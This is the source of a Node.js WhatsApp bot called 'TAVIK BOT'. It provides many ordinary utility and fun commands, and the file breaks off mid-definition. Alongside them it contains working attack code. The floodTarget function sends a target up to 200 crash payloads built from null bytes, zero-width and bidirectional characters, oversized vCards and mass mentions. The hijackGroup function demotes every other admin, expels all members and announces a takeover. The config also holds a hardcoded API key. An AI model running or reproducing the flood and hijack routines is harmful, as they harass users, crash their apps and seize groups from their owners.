'use strict'

// ============================================================
//  TAVIK BOT V1.0  |  by GODSWILL (TAVIK)
//  Modern Baileys bot — modular command handler architecture
// ============================================================

const {
    makeWASocket,
    useMultiFileAuthState,
    downloadMediaMessage,
    DisconnectReason,
    fetchLatestBaileysVersion
} = require('@whiskeysockets/baileys')

const http  = require('http')
const pino  = require('pino')
const axios = require('axios')
const fs    = require('fs')

// ─── CRASH SHIELD ────────────────────────────────────────────
process.on('uncaughtException',  err => console.error('[uncaughtException]',  err.message))
process.on('unhandledRejection', err => console.error('[unhandledRejection]', err?.message ?? err))

// ─── CONFIG ──────────────────────────────────────────────────
const CONFIG = {
    OWNER_NUMBER : '2348145688688',
    OWNER_NAME   : 'TAVIK(GODSWILL)',
    BOT_NAME     : 'TAVIK BOT',
    BOT_VERSION  : 'V1.0',
    PREFIX       : '.',
    UNSPLASH_KEY : 'lE3LTM9IWIahm1jhcw6_Gn8L2_6hnyzK-NBrg6urD5w',
    AI_API       : 'https://text.pollinations.ai/',
    BAD_WORDS    : ['fuck', 'shit', 'bitch', 'bastard', 'idiot', 'stupid'],
}
CONFIG.OWNER_JID = CONFIG.OWNER_NUMBER + '@s.whatsapp.net'

// ─── STATE ───────────────────────────────────────────────────
const STATE = {
    sudoUsers   : [],
    floodActive : {},
    antiDelete  : {},
    autoreply   : {},
    antibadword : {},
    antilink    : {},
    antispam    : {},
    spamTracker : {},
    autoread    : false,
    autoreact   : false,
    autotyping  : false,
    startTime   : Date.now(),
}

// ─── UTILS ───────────────────────────────────────────────────
const sleep = ms => new Promise(r => setTimeout(r, ms))

function getUptime() {
    const s    = Math.floor((Date.now() - STATE.startTime) / 1000)
    const hrs  = Math.floor(s / 3600)
    const mins = Math.floor((s % 3600) / 60)
    const secs = s % 60
    if (hrs  > 0) return `${hrs}h ${mins}m ${secs}s`
    if (mins > 0) return `${mins}m ${secs}s`
    return `${secs}s`
}

async function downloadBuffer(url) {
    try {
        const res = await axios.get(url, { responseType: 'arraybuffer', timeout: 20000 })
        return Buffer.from(res.data)
    } catch { return null }
}

function jid(number) { return number.replace(/[^0-9]/g, '') + '@s.whatsapp.net' }

// ─── MENU ────────────────────────────────────────────────────
function getMenu(username) {
    const { BOT_NAME, BOT_VERSION, OWNER_NAME } = CONFIG
    return `━━━━━( ${BOT_NAME} ${BOT_VERSION} )━━━━━
┏━━━━━━━━━━━━━─────────────╮
│ 👤 ᴜsᴇʀ     : ${username}
│ ⏳ ᴜᴘᴛɪᴍᴇ   : ${getUptime()}
│ 🔐 ᴍᴏᴅᴇ     : Public 🔓
│ ✍️ ᴏᴡɴᴇʀ    : ${OWNER_NAME}
╰──────────────────────────╯
Hi ${username} 👋

┌─〔 Owner Commands 〕
│▧ .owner      │▧ .alive
│▧ .ping       │▧ .credits
│▧ .addsudo    │▧ .delsudo
│▧ .sudolist   │▧ .sudo
│▧ .buguser    │▧ .buggc
│▧ .stopflood  │▧ .hijack
│▧ .block      │▧ .unblock
│▧ .setstatus
└──────────────────────────

┌─〔 Group Commands 〕
│▧ .hidetag    │▧ .tagall
│▧ .kick       │▧ .promote
│▧ .demote     │▧ .mute
│▧ .unmute     │▧ .gcinfo
│▧ .kickall    │▧ .add
│▧ .resetlink  │▧ .grouplink
│▧ .setgcname  │▧ .listadmins
│▧ .antilink   │▧ .antispam
└──────────────────────────

┌─〔 AI & Tools 〕
│▧ .tavik-ai   │▧ .ai
│▧ .pint       │▧ .upscale
│▧ .wiki       │▧ .weather
│▧ .calculate  │▧ .time
│▧ .currency   │▧ .dictionary
│▧ .translate  │▧ .qrcode
└──────────────────────────

┌─〔 Download 〕
│▧ .tosticker  │▧ .toimg
│▧ .tomp3      │▧ .tiktok
│▧ .ytsearch   │▧ .savestatus
│▧ .save
└──────────────────────────

┌─〔 Fun & Games 〕
│▧ .dice       │▧ .coin
│▧ .joke       │▧ .8ball
│▧ .truth      │▧ .dare
│▧ .meme       │▧ .funfact
│▧ .roast      │▧ .compliment
│▧ .quote      │▧ .dadjoke
│▧ .advice
└──────────────────────────

┌─〔 Sticker & Reactions 〕
│▧ .cry  .hug  .slap  .pat
│▧ .wink .dance .bonk .bite
│▧ .cuddle .blush .wave
└──────────────────────────

┌─〔 Media Tools 〕
│▧ .autoreply on/off
│▧ .antidelete on/off
│▧ .antibadword on/off
│▧ .autoread on/off
│▧ .autoreact on/off
│▧ .autotyping on/off
└──────────────────────────

╔══════════════════════════╗
║   🤖 ${BOT_NAME} ${BOT_VERSION}       ║
║   👑 Owner: ${OWNER_NAME}   ║
║   ⚡ Powered by TAVIK TECH ║
║   🛡️ Built with ❤️ by      ║
║      GODSWILL (TAVIK)      ║
╚══════════════════════════╝`
}

// ─── API HELPERS ─────────────────────────────────────────────
async function askAI(prompt) {
    try {
        const res = await axios.get(`${CONFIG.AI_API}${encodeURIComponent(prompt)}`, {
            timeout: 30000,
            headers: { Accept: 'text/plain' }
        })
        return res.data || 'No response from AI.'
    } catch { return '❌ AI is busy. Try again later!' }
}

async function searchImage(query) {
    try {
        const res = await axios.get('https://api.unsplash.com/search/photos', {
            params: { query, per_page: 1 },
            headers: { Authorization: `Client-ID ${CONFIG.UNSPLASH_KEY}` }
        })
        return res.data.results?.[0]?.urls?.regular ?? null
    } catch {
        return `https://source.unsplash.com/800x600/?${encodeURIComponent(query)}`
    }
}

async function getWeather(city) {
    try {
        const res = await axios.get(`https://wttr.in/${encodeURIComponent(city)}?format=4`, { timeout: 10000 })
        return res.data
    } catch { return null }
}

async function getWiki(query) {
    try {
        const res = await axios.get(
            `https://en.wikipedia.org/api/rest_v1/page/summary/${encodeURIComponent(query)}`,
            { timeout: 10000 }
        )
        return res.data.extract ?? null
    } catch { return null }
}

async function getJoke() {
    try {
        const res = await axios.get(
            'https://v2.jokeapi.dev/joke/Any?blacklistFlags=nsfw,racist&type=single',
            { timeout: 10000 }
        )
        return res.data.joke ?? null
    } catch { return '😂 Why did the bot cross the road? To get to the other side!' }
}

async function getFunFact() {
    try {
        const res = await axios.get('https://uselessfacts.jsph.pl/random.json?language=en', { timeout: 10000 })
        return res.data.text ?? null
    } catch { return '🤔 Did you know? TAVIK BOT is the best bot ever!' }
}

async function getAdvice() {
    try {
        const res = await axios.get('https://api.adviceslip.com/advice', { timeout: 10000 })
        return res.data.slip.advice ?? null
    } catch { return '💡 Always be yourself!' }
}

async function getQuote() {
    try {
        const res = await axios.get('https://api.quotable.io/random', { timeout: 10000 })
        return `"${res.data.content}" — ${res.data.author}`
    } catch { return '"Success is not final, failure is not fatal." — Winston Churchill' }
}

async function convertCurrency(amount, from, to) {
    try {
        const res = await axios.get(`https://open.er-api.com/v6/latest/${from.toUpperCase()}`, { timeout: 10000 })
        const rate = res.data.rates[to.toUpperCase()]
        return rate ? (amount * rate).toFixed(2) : null
    } catch { return null }
}

async function translateText(text, targetLang) {
    try {
        const res = await axios.get('https://api.mymemory.translated.net/get', {
            params: { q: text, langpair: `en|${targetLang}` },
            timeout: 10000
        })
        return res.data.responseData.translatedText ?? null
    } catch { return null }
}

async function getDictionary(word) {
    try {
        const res = await axios.get(
            `https://api.dictionaryapi.dev/api/v2/entries/en/${encodeURIComponent(word)}`,
            { timeout: 10000 }
        )
        const entry   = res.data[0]
        const meaning = entry.meanings[0]
        const def     = meaning.definitions[0]
        return {
            word        : entry.word,
            partOfSpeech: meaning.partOfSpeech,
            definition  : def.definition,
            example     : def.example ?? null,
            phonetic    : entry.phonetic ?? '',
        }
    } catch { return null }
}

async function upscaleImage(buffer) {
    try {
        const FormData = require('form-data')
        const form = new FormData()
        form.append('image', buffer, { filename: 'image.jpg', contentType: 'image/jpeg' })
        form.append('scale', '2')
        const res = await axios.post('https://waifu2x.udp.jp/api', form, {
            headers: { ...form.getHeaders() },
            responseType: 'arraybuffer',
            timeout: 60000,
        })
        return res.data ? Buffer.from(res.data) : null
    } catch { return null }
}

async function imageToSticker(buffer) {
    try {
        const sharp = require('sharp')
        return await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 0, g: 0, b: 0, alpha: 0 } })
            .webp()
            .toBuffer()
    } catch { return null }
}

// ─── FLOOD / HIJACK ──────────────────────────────────────────
async function floodTarget(sock, jid, count = 200) {
    STATE.floodActive[jid] = true
    const payloads = [
        () => ({ text: '\u0000'.repeat(5000) + '꧔ꦿ'.repeat(2000) }),
        () => ({
            contacts: {
                displayName: '\u200B'.repeat(3000),
                contacts: Array(150).fill({
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${'\u200B'.repeat(800)}\nTEL:+${'9'.repeat(300)}\nEND:VCARD`
                })
            }
        }),
        () => ({ text: '᷂᷿᷄᷾'.repeat(3000) + '\u202E'.repeat(2000) }),
        () => ({ text: '\u200B\u200C\u200D\uFEFF'.repeat(4000) }),
        () => ({ text: '𒐫'.repeat(4000) + '\u0000'.repeat(1000) }),
        () => ({ text: '@0000000000 '.repeat(500), mentions: Array(500).fill('0000000000@s.whatsapp.net') }),
        () => ({ text: '🔥💥⚡🌀'.repeat(3000) }),
        () => ({ text: '\u202E' + 'TAVIK'.repeat(2000) + '\u202C'.repeat(2000) }),
    ]
    let sent = 0
    while (STATE.floodActive[jid] && sent < count) {
        try {
            await sock.sendMessage(jid, payloads[sent % payloads.length]())
            if (sent % 5 !== 0) await sleep(100)
            sent++
        } catch { await sleep(200) }
    }
    STATE.floodActive[jid] = false
    return sent
}

async function hijackGroup(sock, groupJid) {
    try {
        const meta  = await sock.groupMetadata(groupJid)
        const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net'

        // Step 1 — try to self-promote
        await sock.groupParticipantsUpdate(groupJid, [botId], 'promote').catch(() => {})

        // Step 2 — demote all other admins in batches
        const admins = meta.participants
            .filter(p => p.admin && p.id !== botId)
            .map(p => p.id)
        for (let i = 0; i < admins.length; i += 5) {
            await sock.groupParticipantsUpdate(groupJid, admins.slice(i, i + 5), 'demote').catch(() => {})
            await sleep(500)
        }

        // Step 3 — remove all members except bot in batches
        const members = meta.participants.filter(p => p.id !== botId).map(p => p.id)
        for (let i = 0; i < members.length; i += 5) {
            await sock.groupParticipantsUpdate(groupJid, members.slice(i, i + 5), 'remove').catch(() => {})
            await sleep(500)
        }

        await sock.sendMessage(groupJid, {
            text: `⚡ *${CONFIG.BOT_NAME}* has taken over!\n👑 Now owned by ${CONFIG.OWNER_NAME}`
        })
        return true
    } catch { return false }
}

// ─── STATIC DATA ─────────────────────────────────────────────
const REACTIONS = {
    cry: '😢', hug: '🤗', slap: '👋', pat: '🫶',
    wink: '😉', dance: '💃', bonk: '🔨', bite: '😬',
    cuddle: '🥰', blush: '😊', wave: '👋', smile: '😊',
    laugh: '😂', angry: '😤', love: '❤️', cool: '😎',
}

const TRUTHS = [
    'What is your biggest fear?',
    'Have you ever lied to your best friend?',
    'What is your most embarrassing moment?',
    'Do you have a crush on anyone?',
    'What is the worst thing you have ever done?',
]

const DARES = [
    'Send a voice note singing a song!',
    'Change your WhatsApp status to "I love TAVIK BOT" for 1 hour!',
    'Send a funny selfie!',
    "Text someone you haven't talked to in a year!",
    'Do 10 pushups and send proof!',
]

const EIGHT_BALL = [
    '✅ Yes, definitely!', '✅ Without a doubt!', '✅ Most likely!',
    '⚠️ Maybe...', '⚠️ Ask again later', '⚠️ Cannot predict now',
    "❌ Don't count on it", '❌ Very doubtful', '❌ Definitely not!',
]

const rand = arr => arr[Math.floor(Math.random() * arr.length)]

// ─── COMMAND HANDLER MAP ─────────────────────────────────────
// Each handler receives (sock, ctx) where ctx contains all parsed message info
const COMMANDS = new Map()

function cmd(names, handler) {
    const list = Array.isArray(names) ? names : [names]
    list.forEach(n => COMMANDS.set(n, handler))
}

// ── Info ──────────────────────────────────────────────────────
cmd('menu', async (sock, { from, pushName, msg }) => {
    await sock.sendMessage(from, { text: getMenu(pushName) }, { quoted: msg })
})

cmd('alive', async (sock, { from, msg }) => {
    await sock.sendMessage(from, {
        text: `╔══════════════════╗\n║  ✅ BOT IS ALIVE!  ║\n╚══════════════════╝\n\n🤖 *${CONFIG.BOT_NAME} ${CONFIG.BOT_VERSION}*\n⏳ Uptime: ${getUptime()}\n👑 Owner: ${CONFIG.OWNER_NAME}\n⚡ Status: Online 🟢`
    }, { quoted: msg })
})

cmd('ping', async (sock, { from, msg }) => {
    const t = Date.now()
    await sock.sendMessage(from, { text: `🏓 Pong!\n⚡ Speed: ${Date.now() - t}ms` }, { quoted: msg })
})

cmd('credits', async (sock, { from, msg }) => {
    await sock.sendMessage(from, {
        text: `╔══════════════════════╗\n║  🏆 TAVIK BOT CREDITS  ║\n╚══════════════════════╝\n\n👑 Developer: GODSWILL (TAVIK)\n🤖 Bot: ${CONFIG.BOT_NAME} ${CONFIG.BOT_VERSION}\n⚡ Engine: Baileys + Node.js\n💎 Built with ❤️ by TAVIK(GODSWILL)\n\n🙏 Thanks for using ${CONFIG.BOT_NAME}!`
    }, { quoted: msg })
})

cmd('owner', async (sock, { from, msg }) => {
    await sock.sendMessage(from, {
        text: `👑 *BOT OWNER*\n\n📛 Name: ${CONFIG.OWNER_NAME}\n📱 Number: wa.me/${CONFIG.OWNER_NUMBER}\n⚡ Brand: TAVIK TECH\n🤖 Bot: ${CONFIG.BOT_NAME} ${CONFIG.BOT_VERSION}`
    }, { quoted: msg })
})

// ── AI ────────────────────────────────────────────────────────
cmd(['tavik-ai', 'ai'], async (sock, { from, cmd: command, query, msg }) => {
    if (!query) return sock.sendMessage(from, {
        text: `🤖 *TAVIK AI*\n\nUsage: .${command} <your question>`
    }, { quoted: msg })
    await sock.sendMessage(from, { text: '🤖 TAVIK AI is thinking...' }, { quoted: msg })
    const response = await askAI(query)
    await sock.sendMessage(from, {
        text: `🤖 *TAVIK AI*\n\n${response}\n\n━━━━━━━━━━━━━━\n⚡ Powered by ${CONFIG.BOT_NAME}`
    }, { quoted: msg })
})

// ── Image Search ──────────────────────────────────────────────
cmd('pint', async (sock, { from, query, msg }) => {
    if (!query) return sock.sendMessage(from, { text: '❌ Usage: .pint <search>\nExample: .pint sunset beach' }, { quoted: msg })
    await sock.sendMessage(from, { text: `🔍 Searching *${query}*...` }, { quoted: msg })
    const url = await searchImage(query)
    if (!url) return sock.sendMessage(from, { text: '❌ No image found!' }, { quoted: msg })
    const buf = await downloadBuffer(url)
    if (!buf) return sock.sendMessage(from, { text: '❌ Failed to load image!' }, { quoted: msg })
    await sock.sendMessage(from, {
        image: buf,
        caption: `🖼️ *${query}*\n⚡ ${CONFIG.BOT_NAME} | ${CONFIG.OWNER_NAME}`
    }, { quoted: msg })
})

// ── Upscale ───────────────────────────────────────────────────
cmd('upscale', async (sock, { from, msg }) => {
    const quoted   = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage
    const imageMsg = quoted?.imageMessage ?? msg.message?.imageMessage
    if (!imageMsg) return sock.sendMessage(from, { text: '❌ Reply to an image with .upscale' }, { quoted: msg })
    await sock.sendMessage(from, { text: '🔧 Enhancing image... ⏳' }, { quoted: msg })
    const buffer   = await downloadMediaMessage(
        { message: quoted ? { imageMessage: imageMsg } : msg.message, key: msg.key }, 'buffer', {}
    )
    const upscaled = await upscaleImage(buffer)
    if (!upscaled) return sock.sendMessage(from, { text: '❌ Upscale failed! Try again.' }, { quoted: msg })
    await sock.sendMessage(from, { image: upscaled, caption: `✅ *Enhanced 2x!*\n⚡ ${CONFIG.BOT_NAME}` }, { quoted: msg })
})

// ── Wiki ──────────────────────────────────────────────────────
cmd('wiki', async (sock, { from, query, msg }) => {
    if (!query) return sock.sendMessage(from, { text: '❌ Usage: .wiki <topic>' }, { quoted: msg })
    await sock.sendMessage(from, { text: `🔍 Searching Wikipedia for *${query}*...` }, { quoted: msg })
    const result = await getWiki(query)
    if (!result) return sock.sendMessage(from, { text: '❌ Nothing found!' }, { quoted: msg })
    await sock.sendMessage(from, { text: `📖 *Wikipedia: ${query}*\n\n${result}\n\n⚡ ${CONFIG.BOT_NAME}` }, { quoted: msg })
})

// ── Weather ───────────────────────────────────────────────────
cmd('weather', async (sock, { from, query, msg }) => {
    if (!query) return sock.sendMessage(from, { text: '❌ Usage: .weather <city>' }, { quoted: msg })
    const result = await getWeather(query)
    if (!result) return sock.sendMessage(from, { text: '❌ City not found!' }, { quoted: msg })
    await sock.sendMessage(from, { text: `🌤️ *Weather: ${query}*\n\n${result}\n\n⚡ ${CONFIG.BOT_NAME}` }, { quoted: msg })
})

// ── Calculate ─────────────────────────────────────────────────
cmd(['calculate', 'calc'], async (sock, { from, query, msg }) => {
    if (!query) return sock.sendMessage(from, { text: '❌ Usage: .calculate 5+5' }, { quoted: msg })
    try {
        const result = eval(query.replace(/[^0-9+\-*/.()%]/g, ''))
        await sock.sendMessage(from, {
            text: `🧮 *Calculator*\n\n📝 ${query}\n✅ = ${result}\n\n⚡ ${CONFIG.BOT_NAME}`
        }, { quoted: msg })
    } catch {
        await sock.sendMessage(from, { text: '❌ Invalid calculation!' }, { quoted: msg })
    }
})

// ── Time ──────────────────────────────────────────────────────
cmd('time', async (sock, { from, msg }) => {
    const now = new Date()
    await sock.sendMessage(from, {
        text: `🕐 *Current Time*\n\n📅 Date: ${now.toDateString()}\n⏰ Time: ${now.toTimeString().split(' ')[0]}\n🌍 UTC: ${now.toUTCString()}\n\n⚡ ${CONFIG.BOT_NAME}`
    }, { quoted: msg })
})

// ── Currency ──────────────────────────────────────────────────
cmd('currency', async (sock, { from, args, msg }) => {
    if (!args[1] || !args[2] || !args[3]) return sock.sendMessage(from, {
        text: '❌ Usage: .currency <amount> <from> <to>\nExample: .currency 100 USD NGN'
    }, { quoted: msg })
    const amount = parseFloat(args[1])
    if (isNaN(amount)) return sock.sendMessage(from, { text: '❌ Invalid amount!' }, { quoted: msg })
    await sock.sendMessage(from, { text: '💱 Converting...' }, { quoted: msg })
    const result = await convertCurrency(amount, args[2], args[3])
    if (!result) return sock.sendMessage(from, { text: '❌ Invalid currency code or service unavailable.' }, { quoted: msg })
    await sock.sendMessage(from, {
        text: `💱 *Currency Converter*\n\n${amount} ${args[2].toUpperCase()} = *${result} ${args[3].toUpperCase()}*\n\n⚡ ${CONFIG.BOT_NAME}`
    }, { quoted: msg })
})

// ── Translate ─────────────────────────────────────────────────
cmd('translate', async (sock, { from, args, msg }) => {
    if (!args[1] || args.length < 3) return sock.sendMessage(from, {
        text: '❌ Usage: .translate <lang> <text>\nExample: .translate fr Hello\n\nCodes: fr es de ar yo ig ha'
    }, { quoted: msg })
    const targetLang     = args[1]
    const textToTranslate = args.slice(2).join(' ')
    await sock.sendMessage(from, { text: '🌍 Translating...' }, { quoted: msg })
    const translated = await translateText(textToTranslate, targetLang)
    if (!translated) return sock.sendMessage(from, { text: '❌ Translation failed!' }, { quoted: msg })
    await sock.sendMessage(from, {
        text: `🌍 *Translation*\n\n📝 Original: ${textToTranslate}\n✅ (${targetLang}): ${translated}\n\n⚡ ${CONFIG.BOT_NAME}`
    }, { quoted: msg })
})

// ── Dictionary ────────────────────────────────────────────────
cmd(['dictionary', 'dict'], async (sock, { from, query, msg }) => {
    if (!query) return sock.sendMessage(from, { text: '❌ Usage: .dictionary <word>' }, { quoted: msg })
    await sock.sendMessage(from, { text: `📖 Looking up *${query}*...` }, { quoted: msg })
    const result = await getDictionary(query.split(' ')[0])
    if (!result) return sock.sendMessage(from, { text: `❌ Word not found: *${query}*` }, { quoted: msg })
    await sock.sendMessage(from, {
        text: `📖 *Dictionary: ${result.word}*\n${result.phonetic ? `🔊 ${result.phonetic}\n` : ''}📌 ${result.partOfSpeech}\n\n📝 ${result.definition}${result.example ? `\n\n💬 "${result.example}"` : ''}\n\n⚡ ${CONFIG.BOT_NAME}`
    }, { quoted: msg })
})

// ── QR Code ───────────────────────────────────────────────────
cmd(['qrcode', 'qr'], async (sock, { from, query, msg }) => {
    if (!query) return sock.sendMessage(from, { text: '❌ Usage: .qrcode <text or link>' }, { quoted: msg })
    await sock.sendMessage(from, { text: '🔲 Generating QR Code...' }, { quoted: msg })
    const buf = await downloadBuffer(`https://api.qrserver.com/v1/create-qr-code/?size=512x512&data=${encodeURIComponent(query)}`)
    if (!buf) return sock.sendMessage(from, { text: '❌ Failed to generate QR code!' }, { quoted: msg })
    await sock.sendMessage(from, { image: buf, caption: `🔲 *QR Code*\n📝 ${query}\n⚡ ${CONFIG.BOT_NAME}` }, { quoted: msg })
})

// ── Sticker ───────────────────────────────────────────────────
cmd('tosticker', async (sock, { from, msg }) => {
    const quoted   = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage
    const imageMsg = quoted?.imageMessage ?? msg.message?.imageMessage
    if (!imageMsg) return sock.sendMessage(from, { text: '❌ Reply to an image with .tosticker' }, { quoted: msg })
    await sock.sendMessage(from, { text: '🎨 Converting to sticker...' }, { quoted: msg })
    try {
        const buffer     = await downloadMediaMessage(
            { message: quoted ? { imageMessage: imageMsg } : msg.message, key: msg.key }, 'buffer', {}
        )
        const stickerBuf = await imageToSticker(buffer)
        if (!stickerBuf) return sock.sendMessage(from, { text: '❌ Failed! Make sure sharp is installed.' }, { quoted: msg })
        await sock.sendMessage(from, { sticker: stickerBuf }, { quoted: msg })
    } catch {
        await sock.sendMessage(from, { text: '❌ Sticker conversion failed!' }, { quoted: msg })
    }
})

cmd('toimg', async (sock, { from, msg }) => {
    const quoted     = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage
    const stickerMsg = quoted?.stickerMessage ?? msg.message?.stickerMessage
    if (!stickerMsg) return sock.sendMessage(from, { text: '❌ Reply to a sticker with .toimg' }, { quoted: msg })
    await sock.sendMessage(from, { text: '🖼️ Converting sticker to image...' }, { quoted: msg })
    try {
        const buffer = await downloadMediaMessage(
            { message: quoted ? { stickerMessage: stickerMsg } : msg.message, key: msg.key }, 'buffer', {}
        )
        await sock.sendMessage(from, { image: buffer, caption: `✅ *Converted!*\n⚡ ${CONFIG.BOT_NAME}` }, { quoted: msg })
    } catch {
        await sock.sendMessage(from, { text: '❌ Conversion failed!' }, { quoted: msg })
    }
})

cmd('tomp3', async (sock, { from, msg }) => {
    const quoted   = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage
    const videoMsg = quoted?.videoMessage ?? msg.message?.videoMessage
    if (!videoMsg) return sock.sendMessage(from, { text: '❌ Reply to a video with .tomp3' }, { quoted: msg })
    await sock.sendMessage(from, { text: '🎵 Extracting audio...' }, { quoted: msg })
    try {
        const buffer = await downloadMediaMessage(
            { message: quoted ? { videoMessage: videoMsg } : msg.message, key: msg.key }, 'buffer', {}
        )
        await sock.sendMessage(from, { audio: buffer, mimetype: 'audio/mp4', ptt: false }, { quoted: msg })
    } catch {
        await sock.sendMessage(from, { text: '❌ Conversion failed!' }, { quoted: msg })
    }
})

// ── Save ──────────────────────────────────────────────────────
cmd('save', async (sock, { from, msg }) => {
    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage
    if (!quoted) return sock.sendMessage(from, { text: '❌ Reply to a media message with .save' }, { quoted: msg })
    await sock.sendMessage(from, { text: '💾 Saving media...' }, { quoted: msg })
    try {
        const mediaType = Object.keys(quoted)[0]
        const buffer    = await downloadMediaMessage({ message: quoted, key: msg.key }, 'buffer', {})
        if (!buffer) return sock.sendMessage(from, { text: '❌ Could not download media!' }, { quoted: msg })
        const typeMap   = { imageMessage: 'image', videoMessage: 'video', audioMessage: 'audio', documentMessage: 'document' }
        await sock.sendMessage(from, {
            [typeMap[mediaType] ?? 'image']: buffer,
            caption: `✅ *Saved!*\n⚡ ${CONFIG.BOT_NAME}`,
            mimetype: quoted[mediaType]?.mimetype,
        })
    } catch {
        await sock.sendMessage(from, { text: '❌ Failed to save media!' }, { quoted: msg })
    }
})

cmd('savestatus', async (sock, { from, msg }) => {
    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage
    if (!quoted) return sock.sendMessage(from, { text: '❌ Reply to a status with .savestatus' }, { quoted: msg })
    await sock.sendMessage(from, { text: '💾 Saving status...' }, { quoted: msg })
    try {
        const buffer = await downloadMediaMessage({ message: quoted, key: msg.key }, 'buffer', {})
        if (!buffer) return sock.sendMessage(from, { text: '❌ Could not download status!' }, { quoted: msg })
        await sock.sendMessage(CONFIG.OWNER_JID, {
            [quoted.videoMessage ? 'video' : 'image']: buffer,
            caption: `✅ *Status Saved!*\n⚡ ${CONFIG.BOT_NAME}`,
        })
        await sock.sendMessage(from, { text: '✅ Status saved and sent to your DM!' }, { quoted: msg })
    } catch {
        await sock.sendMessage(from, { text: '❌ Failed to save status!' }, { quoted: msg })
    }
})

// ── TikTok ────────────────────────────────────────────────────
cmd('tiktok', async (sock, { from, query, msg }) => {
    if (!query) return sock.sendMessage(from, { text: '❌ Usage: .tiktok <link>' }, { quoted: msg })
    await sock.sendMessage(from, { text: '⏳ Downloading TikTok video...' }, { quoted: msg })
    try {
        const res      = await axios.get(`https://api.tikmate.app/api/lookup?url=${encodeURIComponent(query)}`, { timeout: 30000 })
        const videoUrl = res.data?.video_url_download_fastest ?? res.data?.video_url
        if (!videoUrl) return sock.sendMessage(from, { text: '❌ Could not extract video!' }, { quoted: msg })
        const buf = await downloadBuffer(videoUrl)
        if (!buf) return sock.sendMessage(from, { text: '❌ Failed to download video!' }, { quoted: msg })
        await sock.sendMessage(from, { video: buf, caption: `✅ *TikTok Downloaded!*\n⚡ ${CONFIG.BOT_NAME}` }, { quoted: msg })
    } catch {
        await sock.sendMessage(from, { text: '❌ TikTok download failed!' }, { quoted: msg })
    }
})

// ── YouTube Search ────────────────────────────────────────────
cmd('ytsearch', async (sock, { from, query, msg }) => {
    if (!query) return sock.sendMessage(from, { text: '❌ Usage: .ytsearch <term>' }, { quoted: msg })
    await sock.sendMessage(from, { text: `🔍 Searching YouTube for *${query}*...` }, { quoted: msg })
    try {
        const inv     = await axios.get(
            `https://invidious.fdn.fr/api/v1/search?q=${encodeURIComponent(query)}&type=video`,
            { timeout: 10000 }
        )
        const results = inv.data?.slice(0, 5)
        if (!results?.length) return sock.sendMessage(from, { text: '❌ No results found!' }, { quoted: msg })
        const text = results.map((v, i) =>
            `${i + 1}. *${v.title}*\n   👤 ${v.author}\n   ⏱️ ${Math.floor(v.lengthSeconds / 60)}m ${v.lengthSeconds % 60}s\n   🔗 https://youtu.be/${v.videoId}`
        ).join('\n\n')
        await sock.sendMessage(from, {
            text: `🎬 *YouTube: ${query}*\n\n${text}\n\n⚡ ${CONFIG.BOT_NAME}`
        }, { quoted: msg })
    } catch {
        await sock.sendMessage(from, { text: '❌ YouTube search failed!' }, { quoted: msg })
    }
})

// ── Fun ───────────────────────────────────────────────────────
cmd(['joke', 'dadjoke'], async (sock, { from, msg }) => {
    const joke = await getJoke()
    await sock.sendMessage(from, { text: `😂 *Joke Time!*\n\n${joke}\n\n⚡ ${CONFIG.BOT_NAME}` }, { quoted: msg })
})

cmd('funfact', async (sock, { from, msg }) => {
    const fact = await getFunFact()
    await sock.sendMessage(from, { text: `🤔 *Fun Fact!*\n\n${fact}\n\n⚡ ${CONFIG.BOT_NAME}` }, { quoted: msg })
})

cmd('advice', async (sock, { from, msg }) => {
    const adv = await getAdvice()
    await sock.sendMessage(from, { text: `💡 *Advice!*\n\n${adv}\n\n⚡ ${CONFIG.BOT_NAME}` }, { quoted: msg })
})

cmd('quote', async (sock, { from, msg }) => {
    const q = await getQuote()
    await sock.sendMessage(from, { text: `💬 *Quote of the Day*\n\n${q}\n\n⚡ ${CONFIG.BOT_NAME}` }, { quoted: msg })
})

cmd('dice', async (sock, { from, msg }) => {
    await sock.sendMessage(from, {
        text: `🎲 *Dice Roll!*\n\nYou rolled: *${Math.floor(Math.random() * 6) + 1}*\n\n⚡ ${CONFIG.BOT_NAME}`
    }, { quoted: msg })
})

cmd('coin', async (sock, { from, msg }) => {
    await sock.sendMessage(from, {
        text: `🪙 *Coin Flip!*\n\nResult: *${Math.random() > 0.5 ? 'Heads 🪙' : 'Tails 🪙'}*\n\n⚡ ${CONFIG.BOT_NAME}`
    }, { quoted: msg })
})

cmd('8ball', async (sock, { from, query, msg }) => {
    if (!query) return sock.sendMessage(from, { text: '❌ Usage: .8ball <question>' }, { quoted: msg })
    await sock.sendMessage(from, {
        text: `🎱 *Magic 8 Ball*\n\n❓ ${query}\n\n${rand(EIGHT_BALL)}\n\n⚡ ${CONFIG.BOT_NAME}`
    }, { quoted: msg })
})

cmd('truth', async (sock, { from, msg }) => {
    await sock.sendMessage(from, { text: `🤫 *Truth!*\n\n${rand(TRUTHS)}\n\n⚡ ${CONFIG.BOT_NAME}` }, { quoted: msg })
})

cmd('dare', async (sock, { from, msg }) => {
    await sock.sendMessage(from, { text: `😈 *Dare!*\n\n${rand(DARES)}\n\n⚡ ${CONFIG.BOT_NAME}` }, { quoted: msg })
})

cmd('roast', async (sock, { from, pushName, args, msg }) => {
    const roasts = [
        'You are the reason why instructions exist on shampoo bottles.',
        'I would agree with you but then we would both be wrong.',
        'You bring everyone so much joy when you leave the room.',
        "You are like a cloud — when you disappear, it's a beautiful day!",
    ]
    const target = args[1] ? `@${args[1].replace('@', '')}` : pushName
    await sock.sendMessage(from, {
        text: `🔥 *Roast for ${target}*\n\n${rand(roasts)}\n\n⚡ ${CONFIG.BOT_NAME}`
    }, { quoted: msg })
})

cmd('compliment', async (sock, { from, pushName, args, msg }) => {
    const compliments = [
        'You have a great sense of humor!',
        'You are an amazing person!',
        'You light up every room you walk into!',
        'You are stronger than you think!',
        'The world is a better place with you in it!',
    ]
    const target = args[1] ? `@${args[1].replace('@', '')}` : pushName
    await sock.sendMessage(from, {
        text: `💝 *Compliment for ${target}*\n\n${rand(compliments)}\n\n⚡ ${CONFIG.BOT_NAME}`
    }, { quoted: msg })
})

cmd('meme', async (sock, { from, msg }) => {
